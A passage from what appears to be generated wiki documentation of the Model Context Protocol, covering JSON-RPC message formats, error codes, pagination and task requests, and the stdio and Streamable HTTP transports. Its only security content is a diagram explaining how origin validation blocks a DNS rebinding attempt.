| `jsonrpc` | string | Yes | **MUST** be `"2.0"` |
| `id` | string \| number | Yes | Unique identifier for this request within the session |
| `method` | string | Yes | The name of the method to invoke |
| `params` | object | No | Parameters for the method |

**Key requirements:**

- The `id` field **MUST NOT** be `null` (unlike base JSON-RPC 2.0)
- The `id` **MUST NOT** have been previously used by the requestor within the same session
- The `id` can be any string or number value

**Example:**

```json
{
  "jsonrpc": "2.0",
  "id": 1,
  "method": "tools/call",
  "params": {
    "name": "get_weather",
    "arguments": {
      "city": "Paris"
    }
  }
}
```

Sources: [schema/draft/schema.ts:158-161](), [docs/specification/2025-06-18/basic/index.mdx:37-51]()

### Responses

A **response** is sent in reply to a request. It contains either a successful result or an error, but never both.

**Structure** [schema/draft/schema.ts:177-199]():

| Field | Type | Required | Description |
|-------|------|----------|-------------|
| `jsonrpc` | string | Yes | **MUST** be `"2.0"` |
| `id` | string \| number | Yes | **MUST** match the ID of the request being answered |
| `result` | object | Conditional | The result of the operation (if successful) |
| `error` | Error | Conditional | Error information (if failed) |

**Key requirements:**

- Either `result` or `error` **MUST** be present, but not both
- The `id` **MUST** match the request ID exactly
- Results can follow any JSON object structure
- Errors **MUST** include a code and message

**Successful response example:**

```json
{
  "jsonrpc": "2.0",
  "id": 1,
  "result": {
    "content": [
      {
        "type": "text",
        "text": "Current weather in Paris: 18°C, partly cloudy"
      }
    ],
    "isError": false
  }
}
```

**Error response example:**

```json
{
  "jsonrpc": "2.0",
  "id": 1,
  "error": {
    "code": -32601,
    "message": "Method not found",
    "data": {
      "method": "unknown_method"
    }
  }
}
```

Sources: [schema/draft/schema.ts:177-199](), [docs/specification/2025-06-18/basic/index.mdx:57-78]()

### Notifications

A **notification** is a one-way message that does not expect a response. Either party can send notifications.

**Structure** [schema/draft/schema.ts:168-170]():

| Field | Type | Required | Description |
|-------|------|----------|-------------|
| `jsonrpc` | string | Yes | **MUST** be `"2.0"` |
| `method` | string | Yes | The name of the notification |
| `params` | object | No | Parameters for the notification |

**Key requirements:**

- **MUST NOT** include an `id` field
- The receiver **MUST NOT** send a response
- Notifications are fire-and-forget messages

**Example:**

```json
{
  "jsonrpc": "2.0",
  "method": "notifications/initialized",
  "params": {}
}
```

Sources: [schema/draft/schema.ts:168-170](), [docs/specification/2025-06-18/basic/index.mdx:85-95]()

## Error Handling

MCP defines a set of standard JSON-RPC error codes and additional implementation-specific codes for protocol-level errors.

### Standard Error Codes

[schema/draft/schema.ts:201-206]() defines the standard JSON-RPC 2.0 error codes:

| Code | Name | Description |
|------|------|-------------|
| `-32700` | `PARSE_ERROR` | Invalid JSON was received by the server |
| `-32600` | `INVALID_REQUEST` | The request object is not a valid JSON-RPC request |
| `-32601` | `METHOD_NOT_FOUND` | The requested method does not exist or is not available |
| `-32602` | `INVALID_PARAMS` | Invalid method parameters or malformed arguments |
| `-32603` | `INTERNAL_ERROR` | Internal error on the receiver |

### Error Object Structure

[schema/draft/schema.ts:131-144]() defines the error object:

```typescript
interface Error {
  code: number;           // Error code (integer)
  message: string;        // Short description (single sentence recommended)
  data?: unknown;         // Additional error information (optional)
}
```

**Example error with additional data:**

```json
{
  "code": -32602,
  "message": "Invalid parameters",
  "data": {
    "reason": "Unknown tool name",
    "toolName": "nonexistent_tool"
  }
}
```

### MCP-Specific Error Codes

MCP defines implementation-specific error codes in the range `[-32000, -32099]` for protocol-level errors:

| Code | Name | Usage |
|------|------|-------|
| `-32042` | `URL_ELICITATION_REQUIRED` | Server requires user interaction via URL mode elicitation before the request can be processed |

[schema/draft/schema.ts:301-322]() defines the `URLElicitationRequiredError` structure, which includes a list of required elicitations in the error data.

Sources: [schema/draft/schema.ts:131-144](), [schema/draft/schema.ts:201-206](), [schema/draft/schema.ts:301-322]()

## Request and Response Parameters

### RequestParams and RequestMetaObject

All request parameters extend [schema/draft/schema.ts:89-91]() `RequestParams`:

```typescript
interface RequestParams {
  _meta?: RequestMetaObject;
}
```

The `_meta` field is optional and carries request-specific metadata. [schema/draft/schema.ts:46-51]() defines `RequestMetaObject`:

```typescript
interface RequestMetaObject extends MetaObject {
  progressToken?: ProgressToken;
}
```

The `progressToken` field allows requestors to request out-of-band progress notifications. If specified, the receiver **SHOULD** send `notifications/progress` messages with this token to associate progress updates with the original request.

### Result Structure

All successful responses contain a [schema/draft/schema.ts:123-126]() `Result` object:

```typescript
interface Result {
  _meta?: MetaObject;
  [key: string]: unknown;
}
```

Results can contain any JSON object structure, with an optional `_meta` field for metadata.

### MetaObject and Key Naming Rules

[schema/draft/schema.ts:37]() defines `MetaObject` as a simple record type. However, [schema/draft/schema.ts:18-34]() specifies strict naming rules for keys in `_meta` fields:

**Valid key format:** `[prefix/]name`

**Prefix rules:**
- Optional; if specified, must be labels separated by dots (`.`), followed by a slash (`/`)
- Labels must start with a letter and end with a letter or digit
- Interior characters may be letters, digits, or hyphens (`-`)
- Any prefix containing `modelcontextprotocol` or `mcp` is **reserved** for MCP use
  - Examples: `modelcontextprotocol.io/`, `mcp.dev/`, `api.modelcontextprotocol.org/`

**Name rules:**
- Unless empty, must start and end with alphanumeric characters (`[a-z0-9A-Z]`)
- Interior characters may be alphanumeric, hyphens (`-`), underscores (`_`), or dots (`.`)

**Example valid keys:**
- `progressToken` (no prefix)
- `custom/myKey` (custom prefix)
- `io.modelcontextprotocol/relatedTask` (reserved MCP prefix)

Sources: [schema/draft/schema.ts:37](), [schema/draft/schema.ts:18-34](), [schema/draft/schema.ts:46-51]()

## Message Flow Patterns

### Request-Response Pattern

The standard synchronous pattern where a requestor sends a request and waits for a response:

```mermaid
sequenceDiagram
    participant "Requestor" as req
    participant "Receiver" as recv
    
    req->>recv: JSONRPCRequest (id: 123)
    Note over recv: Process request
    recv->>req: JSONRPCResultResponse (id: 123)<br/>or JSONRPCErrorResponse (id: 123)
```

### Notification Pattern

One-way messages that do not expect responses:

```mermaid
sequenceDiagram
    participant "Sender" as send
    participant "Receiver" as recv
    
    send->>recv: JSONRPCNotification
    Note over recv: Process notification<br/>(no response sent)
```

### Bidirectional Communication

MCP enables both clients and servers to send requests to each other:

```mermaid
sequenceDiagram
    participant "Client" as client
    participant "Server" as server
    
    Note over client,server: Client initiates
    client->>server: JSONRPCRequest (method: tools/call)
    
    Note over server: Server needs user input
    server->>client: JSONRPCRequest (method: elicitation/create)
    client->>server: JSONRPCResponse
    
    Note over server: Complete original request
    server->>client: JSONRPCResponse (to tools/call)
```

Sources: [docs/specification/draft/client/elicitation.mdx:450-495]()

## Message Type Mapping

The following diagram maps protocol method names to their corresponding message types and code entities:

```mermaid
graph TB
    subgraph "Client-Initiated Requests"
        CR1["initialize"]
        CR2["resources/list, resources/read"]
        CR3["prompts/list, prompts/get"]
        CR4["tools/list, tools/call"]
        CR5["completion/complete"]
        CR6["tasks/get, tasks/list, tasks/cancel"]
    end
    
    subgraph "Server-Initiated Requests"
        SR1["sampling/createMessage"]
        SR2["elicitation/create"]
    end
    
    subgraph "Notifications (Either Direction)"
        N1["notifications/initialized"]
        N2["notifications/progress"]
        N3["notifications/cancelled"]
        N4["notifications/resources/list_changed"]
        N5["notifications/prompts/list_changed"]
        N6["notifications/tools/list_changed"]
        N7["notifications/tasks/status"]
    end
    
    subgraph "Code Entities"
        REQ["JSONRPCRequest<br/>id: RequestId<br/>method: string<br/>params: RequestParams"]
        RESP["JSONRPCResponse<br/>id: RequestId<br/>result or error"]
        NOTIF["JSONRPCNotification<br/>method: string<br/>params: NotificationParams<br/>no id field"]
    end
    
    CR1 --> REQ
    CR2 --> REQ
    CR3 --> REQ
    CR4 --> REQ
    CR5 --> REQ
    CR6 --> REQ
    SR1 --> REQ
    SR2 --> REQ
    
    REQ --> RESP
    
    N1 --> NOTIF
    N2 --> NOTIF
    N3 --> NOTIF
    N4 --> NOTIF
    N5 --> NOTIF
    N6 --> NOTIF
    N7 --> NOTIF
```

Sources: [schema/draft/schema.ts:8-11](), [schema/draft/schema.ts:158-161](), [schema/draft/schema.ts:168-170]()

## Progress Notifications

Requestors can request out-of-band progress updates for long-running operations by including a `progressToken` in the request's `_meta` field.

[schema/draft/schema.ts:836-857]() defines `ProgressNotificationParams`:

```typescript
interface ProgressNotificationParams extends NotificationParams {
  progressToken: ProgressToken;  // Must match the token from the request
  progress: number;              // Current progress value
  total?: number;                // Total progress (if known)
  message?: string;              // Optional status message
}
```

**Example progress notification:**

```json
{
  "jsonrpc": "2.0",
  "method": "notifications/progress",
  "params": {
    "progressToken": "task-123",
    "progress": 50,
    "total": 100,
    "message": "Processing file 50 of 100"
  }
}
```

**Request with progress token:**

```json
{
  "jsonrpc": "2.0",
  "id": 1,
  "method": "tools/call",
  "params": {
    "name": "batch_process",
    "arguments": {},
    "_meta": {
      "progressToken": "task-123"
    }
  }
}
```

Sources: [schema/draft/schema.ts:836-857](), [schema/draft/schema.ts:46-51]()

## Cancellation

Either party can cancel an in-progress request by sending a `notifications/cancelled` notification [schema/draft/schema.ts:341-376]():

```typescript
interface CancelledNotificationParams extends NotificationParams {
  requestId?: RequestId;  // ID of the request to cancel
  reason?: string;        // Optional cancellation reason
}
```

**Example cancellation:**

```json
{
  "jsonrpc": "2.0",
  "method": "notifications/cancelled",
  "params": {
    "requestId": 123,
    "reason": "User requested cancellation"
  }
}
```

**Key requirements:**

- The `requestId` **MUST** correspond to a request previously issued in the same direction
- The `initialize` request **MUST NOT** be cancelled by clients
- For task-augmented requests, use `tasks/cancel` request instead
- Receivers **SHOULD** stop processing and free resources
- Receivers **MAY** ignore cancellations if the request is unknown or already completed

Sources: [schema/draft/schema.ts:341-376](), [docs/specification/draft/basic/utilities/cancellation.mdx]()

## Pagination

List operations support cursor-based pagination through [schema/draft/schema.ts:881-887]() `PaginatedRequestParams`:

```typescript
interface PaginatedRequestParams extends RequestParams {
  cursor?: Cursor;  // Opaque pagination token
}
```

Paginated results include [schema/draft/schema.ts:895-901]() `PaginatedResult`:

```typescript
interface PaginatedResult extends Result {
  nextCursor?: Cursor;  // Token for next page (if more results available)
}
```

**Example paginated request:**

```json
{
  "jsonrpc": "2.0",
  "id": 1,
  "method": "resources/list",
  "params": {
    "cursor": "eyJwYWdlIjogMn0="
  }
}
```

**Example paginated response:**

```json
{
  "jsonrpc": "2.0",
  "id": 1,
  "result": {
    "resources": [
      { "uri": "file:///path/to/file1", "name": "file1" },
      { "uri": "file:///path/to/file2", "name": "file2" }
    ],
    "nextCursor": "eyJwYWdlIjogM30="
  }
}
```

Sources: [schema/draft/schema.ts:881-887](), [schema/draft/schema.ts:895-901]()

## Task-Augmented Requests

Task-augmented requests enable long-running operations with deferred result retrieval. [schema/draft/schema.ts:72-82]() defines `TaskAugmentedRequestParams`:

```typescript
interface TaskAugmentedRequestParams extends RequestParams {
  task?: TaskMetadata;  // If specified, request is task-augmented
}
```

When a request includes a `task` field, the receiver returns a `CreateTaskResult` immediately instead of the actual operation result. The actual result is retrieved later via `tasks/result`.

**Example task-augmented request:**

```json
{
  "jsonrpc": "2.0",
  "id": 1,
  "method": "tools/call",
  "params": {
    "name": "long_running_operation",
    "arguments": {},
    "task": {
      "ttl": 60000
    }
  }
}
```

**Immediate response (not the actual result):**

```json
{
  "jsonrpc": "2.0",
  "id": 1,
  "result": {
    "task": {
      "taskId": "abc-123",
      "status": "working",
      "createdAt": "2025-11-25T10:30:00Z",
      "lastUpdatedAt": "2025-11-25T10:30:00Z",
      "ttl": 60000,
      "pollInterval": 5000
    }
  }
}
```

For detailed information about task lifecycle and polling, see [Task System and Async Operations](#2.7).

Sources: [schema/draft/schema.ts:72-82](), [docs/specification/draft/basic/utilities/tasks.mdx]()

## Implementation Considerations

### ID Management

- Requestors **MUST** ensure IDs are unique within a session
- IDs can be strings or numbers
- Common patterns: sequential integers (1, 2, 3...) or UUIDs
- Receivers **MUST** preserve the ID in responses to enable correlation

### Ordering Guarantees

- JSON-RPC does not guarantee message ordering
- Requestors **MUST** use IDs to correlate responses with requests
- Responses may arrive out of order

### Error Recovery

- Receivers **SHOULD** validate request structure before processing
- Receivers **SHOULD** return appropriate error codes for invalid requests
- Requestors **SHOULD** implement timeout mechanisms for requests

### Metadata Usage

- Use `_meta` for protocol-level metadata only
- Follow the key naming rules strictly
- Avoid assuming values at reserved keys
- Document custom metadata keys in your implementation

Sources: [schema/draft/schema.ts:1-200](), [docs/specification/2025-06-18/basic/index.mdx]()

---

# Page: Transport Layer

# Transport Layer

<details>
<summary>Relevant source files</summary>

The following files were used as context for generating this wiki page:

- [.github/CODEOWNERS](.github/CODEOWNERS)
- [docs/specification/2025-06-18/basic/index.mdx](docs/specification/2025-06-18/basic/index.mdx)
- [docs/specification/2025-06-18/basic/transports.mdx](docs/specification/2025-06-18/basic/transports.mdx)
- [docs/specification/2025-06-18/basic/utilities/cancellation.mdx](docs/specification/2025-06-18/basic/utilities/cancellation.mdx)
- [docs/specification/2025-06-18/basic/utilities/ping.mdx](docs/specification/2025-06-18/basic/utilities/ping.mdx)
- [docs/specification/draft/basic/transports.mdx](docs/specification/draft/basic/transports.mdx)
- [docs/specification/draft/basic/utilities/cancellation.mdx](docs/specification/draft/basic/utilities/cancellation.mdx)
- [docs/specification/draft/basic/utilities/ping.mdx](docs/specification/draft/basic/utilities/ping.mdx)
- [docs/specification/draft/basic/utilities/tasks.mdx](docs/specification/draft/basic/utilities/tasks.mdx)
- [docs/specification/draft/changelog.mdx](docs/specification/draft/changelog.mdx)
- [docs/specification/draft/client/elicitation.mdx](docs/specification/draft/client/elicitation.mdx)
- [docs/specification/draft/client/sampling.mdx](docs/specification/draft/client/sampling.mdx)
- [docs/specification/draft/schema.mdx](docs/specification/draft/schema.mdx)
- [schema/draft/schema.json](schema/draft/schema.json)
- [schema/draft/schema.ts](schema/draft/schema.ts)

</details>



## Purpose and Scope

The transport layer defines how JSON-RPC messages are physically transmitted between MCP clients and servers. This page covers the two standard transport mechanisms (stdio and Streamable HTTP), their message exchange patterns, session management, and transport-specific constraints.

For protocol message types and structure, see [Schema System and Message Types](#2.2). For lifecycle initialization that occurs after transport establishment, see [Lifecycle and Capabilities](#2.4). For HTTP-specific authorization, see [OAuth 2.1 Authorization Framework](#3.1).

**Sources:** [docs/specification/draft/basic/transports.mdx:1-20]()

## Transport Mechanisms

MCP defines two standard transports for carrying UTF-8 encoded JSON-RPC messages:

| Transport | Use Case | Connection Model | Bidirectional |
|-----------|----------|------------------|---------------|
| **stdio** | Local servers as subprocesses | Client launches server process | Yes (stdin/stdout) |
| **Streamable HTTP** | Remote servers with multiple clients | Server runs independently | Yes (POST/GET + SSE) |

Clients **SHOULD** support stdio whenever possible. Implementations **MAY** also create custom transports following the same JSON-RPC message patterns.

**Sources:** [docs/specification/draft/basic/transports.mdx:10-20](), [docs/specification/draft/basic/index.mdx:28-46]()

## stdio Transport

### Architecture

In the stdio transport, the client launches the MCP server as a subprocess and communicates via standard streams.

```mermaid
graph TB
    subgraph "Client Process"
        Client["Client"]
    end
    
    subgraph "Server Subprocess"
        Server["Server"]
        stdin["stdin<br/>(read JSONRPCMessage)"]
        stdout["stdout<br/>(write JSONRPCMessage)"]
        stderr["stderr<br/>(logging only)"]
    end
    
    Client -->|"Launch subprocess"| Server
    Client -->|"Write JSON-RPC<br/>newline-delimited"| stdin
    stdout -->|"Read JSON-RPC<br/>newline-delimited"| Client
    stderr -.->|"Optional logs"| Client
    
    stdin --> Server
    Server --> stdout
    Server -.-> stderr
```

**Sources:** [docs/specification/draft/basic/transports.mdx:22-52]()

### Message Exchange Protocol

**Message Format:**
- Each message **MUST** be a complete `JSONRPCRequest`, `JSONRPCNotification`, or `JSONRPCResponse`
- Messages are newline-delimited (`\n`)
- Messages **MUST NOT** contain embedded newlines
- All messages **MUST** be UTF-8 encoded

**Stream Usage:**
- **stdin**: Server reads JSON-RPC messages from client
- **stdout**: Server writes JSON-RPC messages to client  
- **stderr**: Server **MAY** write UTF-8 logging output (informational, debug, error messages)

**Constraints:**
- Server **MUST NOT** write non-MCP content to stdout
- Client **MUST NOT** write non-MCP content to server's stdin
- Client **MAY** capture, forward, or ignore stderr output
- Client **SHOULD NOT** treat stderr output as error conditions

```mermaid
sequenceDiagram
    participant Client
    participant Server_stdin as "Server stdin"
    participant Server_stdout as "Server stdout"
    participant Server_stderr as "Server stderr"
    
    Note over Client,Server_stderr: Client launches server subprocess
    
    Client->>Server_stdin: InitializeRequest\n
    Server_stdout->>Client: InitializeResult\n
    
    Client->>Server_stdin: InitializedNotification\n
    Server_stdout->>Client: (no response - notification)
    
    Client->>Server_stdin: ListToolsRequest\n
    Server_stdout->>Client: ListToolsResult\n
    
    Server_stderr-->>Client: [DEBUG] Loading tools...
    
    Client->>Server_stdin: CallToolRequest\n
    Server_stderr-->>Client: [INFO] Executing tool...
    Server_stdout->>Client: CallToolResult\n
    
    Note over Client,Server_stderr: Client closes stdin, terminates subprocess
```

**Sources:** [docs/specification/draft/basic/transports.mdx:26-38](), [schema/draft/schema.ts:8-11]()

### Lifecycle

The stdio transport lifecycle follows the subprocess model:

1. **Launch**: Client spawns server as child process
2. **Exchange**: Bidirectional JSON-RPC message flow via stdin/stdout
3. **Termination**: Client closes stdin and terminates subprocess

The server process lifetime is bound to the client process. When the client terminates or closes stdin, the server **SHOULD** gracefully shutdown.

**Sources:** [docs/specification/draft/basic/transports.mdx:39-52]()

## Streamable HTTP Transport

### Architecture

In Streamable HTTP transport, the server operates as an independent HTTP service that can handle multiple concurrent client connections. The transport uses HTTP POST for client messages and optionally uses Server-Sent Events (SSE) for streaming server responses.

```mermaid
graph TB
    subgraph "Client"
        HTTPClient["HTTP Client"]
        SSEReader["SSE Stream Reader"]
    end
    
    subgraph "MCP Server (HTTP Service)"
        MCPEndpoint["MCP Endpoint<br/>/mcp"]
        POSTHandler["POST Handler<br/>(receive client messages)"]
        GETHandler["GET Handler<br/>(SSE streaming)"]
        SessionMgr["Session Manager<br/>(MCP-Session-Id)"]
    end
    
    HTTPClient -->|"POST JSONRPCRequest"| POSTHandler
    HTTPClient -->|"POST JSONRPCNotification"| POSTHandler
    HTTPClient -->|"POST JSONRPCResponse"| POSTHandler
    
    POSTHandler -->|"Content-Type: application/json"| HTTPClient
    POSTHandler -->|"Content-Type: text/event-stream"| SSEReader
    POSTHandler --> SessionMgr
    
    HTTPClient -->|"GET (open SSE stream)"| GETHandler
    GETHandler -->|"text/event-stream"| SSEReader
    GETHandler --> SessionMgr
    
    SSEReader -.->|"Last-Event-ID header<br/>(resume stream)"| GETHandler
```

**Sources:** [docs/specification/draft/basic/transports.mdx:54-76]()

### HTTP Endpoint Requirements

Servers **MUST** provide a single HTTP endpoint path (the **MCP endpoint**) that supports both POST and GET methods. For example: `https://example.com/mcp` or `http://localhost:8080/mcp`.

**Headers:**
- `Content-Type: application/json` for JSON responses
- `Content-Type: text/event-stream` for SSE streams
- `Accept: application/json, text/event-stream` from client
- `MCP-Session-Id` for session tracking (optional)
- `MCP-Protocol-Version` for version negotiation
- `Last-Event-ID` for stream resumption (optional)

**Sources:** [docs/specification/draft/basic/transports.mdx:70-74](), [docs/specification/draft/basic/transports.mdx:195-230]()

### Security Requirements

Servers **MUST** implement these security measures:

1. **Origin Validation**: Validate the `Origin` header to prevent DNS rebinding attacks
   - If `Origin` is present and invalid, return HTTP 403 Forbidden
   - Response body **MAY** contain a JSON-RPC error response with no `id`

2. **Local Binding**: When running locally, bind only to `127.0.0.1`, not `0.0.0.0`

3. **Authentication**: Implement proper authentication for all connections (see [OAuth 2.1 Authorization Framework](#3.1))

```mermaid
sequenceDiagram
    participant Attacker
    participant Browser
    participant LocalServer as "Local MCP Server<br/>127.0.0.1:8080"
    
    Note over Attacker,LocalServer: DNS Rebinding Attack Scenario
    
    Attacker->>Browser: Visit malicious site
    Browser->>LocalServer: POST /mcp<br/>Origin: evil.com
    
    alt Origin Validation Enabled
        LocalServer->>Browser: HTTP 403 Forbidden<br/>{"jsonrpc":"2.0","error":...}
        Note over Browser,LocalServer: Attack blocked
    else No Origin Validation
        LocalServer->>Browser: HTTP 200 OK<br/>(processes request)
        Note over Browser,LocalServer: Server compromised!
    end
```

**Sources:** [docs/specification/draft/basic/transports.mdx:76-86]()

### Sending Messages to Server (HTTP POST)

Every JSON-RPC message from client to server **MUST** be a new HTTP POST request.

**Request Flow:**

```mermaid
sequenceDiagram
    participant Client
    participant Server
    
    Note over Client,Server: POST with JSONRPCRequest
    
    Client->>Server: POST /mcp<br/>Accept: application/json, text/event-stream<br/>Body: JSONRPCRequest
    
    alt Server returns JSON immediately
        Server->>Client: HTTP 200<br/>Content-Type: application/json<br/>Body: JSONRPCResultResponse
    else Server initiates SSE stream
        Server->>Client: HTTP 200<br/>Content-Type: text/event-stream<br/>event: message<br/>id: stream-1-event-1<br/>data: {"jsonrpc":"2.0",...}
        
        Note over Server: Server may send additional<br/>requests/notifications
        
        Server->>Client: event: message<br/>id: stream-1-event-2<br/>data: JSONRPCRequest
        
        Client->>Server: POST /mcp (response to server request)
        
        Server->>Client: event: message<br/>id: stream-1-event-3<br/>data: JSONRPCResultResponse<br/><br/>(close stream)
    end
```

**Notification/Response Handling:**

```mermaid
sequenceDiagram
    participant Client
    participant Server
    
    Note over Client,Server: POST with JSONRPCNotification or JSONRPCResponse
    
    Client->>Server: POST /mcp<br/>Body: JSONRPCNotification
    
    alt Server accepts
        Server->>Client: HTTP 202 Accepted<br/>(empty body)
    else Server rejects
        Server->>Client: HTTP 400 Bad Request<br/>Body: JSONRPCErrorResponse (no id)
    end
```

**Requirements:**

1. Client **MUST** include `Accept: application/json, text/event-stream` header
2. Body **MUST** be a single `JSONRPCRequest`, `JSONRPCNotification`, or `JSONRPCResponse`
3. For notifications/responses:
   - Success: HTTP 202 Accepted with no body
   - Failure: HTTP error status with optional JSON-RPC error response (no `id`)
4. For requests, server **MUST** return either:
   - `Content-Type: application/json` with single JSON object
   - `Content-Type: text/event-stream` to initiate SSE stream
5. Client **MUST** support both response types

**Sources:** [docs/specification/draft/basic/transports.mdx:88-134]()

### SSE Stream Lifecycle

When server initiates an SSE stream for a request:

1. Server **SHOULD** immediately send an SSE event with event ID and empty data field (primes reconnection)
2. Server **MAY** close the connection (not stream) after sending an event ID
   - Allows avoiding long-lived connections
   - Client **SHOULD** then "poll" by reconnecting
3. If closing connection early, server **SHOULD** send `retry` field before closing
   - Client **MUST** respect `retry` value (milliseconds before reconnect)
4. Stream **SHOULD** eventually include `JSONRPCResultResponse` or `JSONRPCErrorResponse` for the request
5. Server **MAY** send additional `JSONRPCRequest` or `JSONRPCNotification` messages before the response
   - These **SHOULD** relate to the originating request
6. Server **MAY** terminate stream if session expires
7. After sending final response, server **SHOULD** terminate stream
8. Disconnection **SHOULD NOT** be interpreted as cancellation
   - To cancel, client **SHOULD** send explicit `CancelledNotification`

**Sources:** [docs/specification/draft/basic/transports.mdx:107-134]()

### Listening for Messages from Server (HTTP GET)

Clients **MAY** open an SSE stream without sending a request first, allowing the server to push messages.

```mermaid
sequenceDiagram
    participant Client
    participant Server
    
    Client->>Server: GET /mcp<br/>Accept: text/event-stream
    
    alt Server supports GET streaming
        Server->>Client: HTTP 200<br/>Content-Type: text/event-stream
        
        Note over Server: Server sends unrelated messages
        
        Server->>Client: event: message<br/>data: JSONRPCNotification
        
        Server->>Client: event: message<br/>data: JSONRPCRequest<br/>id: req-123
        
        Client->>Server: POST /mcp<br/>Body: JSONRPCResultResponse (id: req-123)
        
        Note over Client,Server: Either party may close stream
        
    else Server does not support GET streaming
        Server->>Client: HTTP 405 Method Not Allowed
    end
```

**Requirements:**

1. Client **MUST** include `Accept: text/event-stream` header
2. Server **MUST** either:
   - Return `Content-Type: text/event-stream` and open stream
   - Return HTTP 405 Method Not Allowed
3. If streaming:
   - Server **MAY** send `JSONRPCRequest` or `JSONRPCNotification` messages
   - Messages **SHOULD** be unrelated to concurrent client requests
   - Server **MUST NOT** send `JSONRPCResponse` unless resuming a previous stream
   - Server **MAY** close stream at any time
   - Client **MAY** close stream at any time
4. If closing connection without terminating stream, follow same polling behavior as POST

**Sources:** [docs/specification/draft/basic/transports.mdx:136-157]()

### Multiple Concurrent Connections

**Requirements:**

1. Client **MAY** maintain multiple SSE streams simultaneously
2. Server **MUST** send each JSON-RPC message on only one stream
   - **MUST NOT** broadcast same message across multiple streams
3. Risk of message loss **MAY** be mitigated via resumability

This pattern allows clients to:
- Keep one long-lived GET stream for server-initiated messages
- Use POST-initiated streams for request/response pairs
- Maintain separate streams for different logical operations

**Sources:** [docs/specification/draft/basic/transports.mdx:159-165]()

### Resumability and Redelivery

Servers **MAY** implement resumable streams to handle disconnections gracefully.

```mermaid
sequenceDiagram
    participant Client
    participant Server
    
    Note over Client,Server: Initial stream with event IDs
    
    Client->>Server: POST /mcp (InitializeRequest)
    Server->>Client: SSE Stream<br/>event: message<br/>id: sess-abc-stream-1-evt-1<br/>data: {}
    
    Server->>Client: event: message<br/>id: sess-abc-stream-1-evt-2<br/>data: InitializeResult
    
    Server->>Client: (close connection, not stream)
    
    Note over Client: Client disconnects<br/>(network failure or server closure)
    
    Note over Client,Server: Client resumes with Last-Event-ID
    
    Client->>Server: GET /mcp<br/>Last-Event-ID: sess-abc-stream-1-evt-2
    
    Server->>Client: SSE Stream<br/>(replay messages after evt-2)
    
    Server->>Client: event: message<br/>id: sess-abc-stream-1-evt-3<br/>data: NotificationMessage
    
    Server->>Client: event: message<br/>id: sess-abc-stream-1-evt-4<br/>data: FinalResponse
```

**Event ID Format:**

1. Servers **MAY** attach `id` field to SSE events per [SSE standard](https://html.spec.whatwg.org/multipage/server-sent-events.html#event-stream-interpretation)
2. If present, ID **MUST** be globally unique across all streams within the session (or per client if no session management)
3. Event IDs **SHOULD** encode information identifying the originating stream
   - Example: `sess-{sessionId}-stream-{streamId}-evt-{eventNum}`

**Resumption Protocol:**

1. Client issues HTTP GET with `Last-Event-ID` header containing last received event ID
2. Server **MAY** replay messages sent after that event ID on the same stream
3. Server **MUST NOT** replay messages from different streams
4. Applies to streams initiated via POST or GET - resumption is always via GET with `Last-Event-ID`

Event IDs act as per-stream cursors, not global broadcast IDs.

**Sources:** [docs/specification/draft/basic/transports.mdx:167-193]()

### Session Management

An MCP session consists of logically related interactions beginning with initialization. Sessions support stateful server implementations.

```mermaid
sequenceDiagram
    participant Client
    participant Server
    
    Note over Client,Server: Initialization with Session ID
    
    Client->>Server: POST /mcp<br/>MCP-Protocol-Version: 2025-11-25<br/>Body: InitializeRequest
    
    Server->>Client: HTTP 200<br/>MCP-Session-Id: sess-550e8400-e29b-41d4<br/>Content-Type: application/json<br/>Body: InitializeResult
    
    Note over Client: Client stores session ID
    
    Client->>Server: POST /mcp<br/>MCP-Session-Id: sess-550e8400-e29b-41d4<br/>Body: InitializedNotification
    
    Server->>Client: HTTP 202 Accepted
    
    Note over Client,Server: All subsequent messages include session ID
    
    Client->>Server: POST /mcp<br/>MCP-Session-Id: sess-550e8400-e29b-41d4<br/>Body: ListToolsRequest
    
    Server->>Client: SSE stream with tools
    
    Note over Client,Server: Session expires after TTL or explicit close
```

**Session ID Requirements:**

1. Server **MAY** assign session ID at initialization by including `MCP-Session-Id` header on `InitializeResult` response
2. Session ID **SHOULD** be globally unique and cryptographically secure (UUID, JWT, cryptographic hash)
3. Session ID **MUST** only contain visible ASCII characters (0x21 to 0x7E)
4. Client **MUST** handle session ID securely (see [Session Hijacking mitigations](#3.2))

**Session Usage:**

1. If `MCP-Session-Id` returned during initialization, client **MUST** include it in `MCP-Session-Id` header on all subsequent HTTP requests
2. Server **SHOULD** validate session ID on all requests:
   - Unknown/invalid/expired ID: Return HTTP 404 Not Found with JSON-RPC error
   - Prevents session hijacking and replay attacks
3. Server **SHOULD** implement session timeouts
4. Server **MAY** destroy session immediately when receiving new `InitializeRequest` for same session

**Sources:** [docs/specification/draft/basic/transports.mdx:195-230]()

### Protocol Version Negotiation

The `MCP-Protocol-Version` header enables version negotiation between client and server.

```mermaid
sequenceDiagram
    participant Client
    participant Server
    
    Note over Client,Server: Client proposes version in initialize
    
    Client->>Server: POST /mcp<br/>MCP-Protocol-Version: 2025-11-25<br/>Body: InitializeRequest<br/>{protocolVersion: "2025-11-25"}
    
    alt Server supports requested version
        Server->>Client: HTTP 200<br/>MCP-Protocol-Version: 2025-11-25<br/>MCP-Session-Id: sess-abc<br/>Body: InitializeResult<br/>{protocolVersion: "2025-11-25"}
        
        Note over Client,Server: Negotiation successful
        
    else Server requires different version
        Server->>Client: HTTP 200<br/>MCP-Protocol-Version: 2025-06-18<br/>Body: InitializeResult<br/>{protocolVersion: "2025-06-18"}
        
        Note over Client: Client must decide:<br/>- Accept server version<br/>- Disconnect if unsupported
    end
```

**Requirements:**

1. Client **SHOULD** include `MCP-Protocol-Version` header on initialization request
   - Value **MUST** match `protocolVersion` in `InitializeRequest` body
2. Server **MUST** return `MCP-Protocol-Version` header on `InitializeResult` response
   - Value **MUST** match `protocolVersion` in `InitializeResult` body
3. Server **MAY** reject incompatible protocol versions with HTTP 400 Bad Request
4. For all subsequent requests in session:
   - Client **MUST** include `MCP-Protocol-Version` header with negotiated version
   - Server **MAY** validate version header consistency

Version format follows `YYYY-MM-DD` pattern for releases or `DRAFT-YYYY-vN` for drafts (see [Protocol Versioning](#2.8)).

**Sources:** [docs/specification/draft/basic/transports.mdx:231-254]()

## Message Flow Comparison

The following diagram illustrates the key differences between stdio and Streamable HTTP transports:

```mermaid
graph TB
    subgraph "stdio Transport"
        SC[Client]
        SS[Server Subprocess]
        
        SC -->|"stdin: ListToolsRequest\n"| SS
        SS -->|"stdout: ListToolsResult\n"| SC
        SS -.->|"stderr: [INFO] Loading...\n"| SC
        
        SC -->|"stdin: CallToolRequest\n"| SS
        SS -->|"stdout: CallToolResult\n"| SC
